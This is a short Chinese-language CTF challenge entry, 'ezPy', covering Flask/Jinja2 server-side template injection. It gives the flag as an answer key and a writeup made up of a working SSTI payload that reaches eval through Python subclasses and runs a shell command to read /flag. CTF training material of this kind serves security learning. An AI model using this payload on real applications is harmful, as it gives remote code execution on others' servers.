- **题目名称：** ezPy
- **题目类型：** WEB
- **题目难度：** 容易
- **出题人：** ABU
- **考点：**

1. python flask ssti模板注入

- **描述：** 直接注就完了
- **flag：** flag{Pyth0n_1s_1mp0rtant!!!!!}
- **Writeup：** 

payload如下

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("cat /flag").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

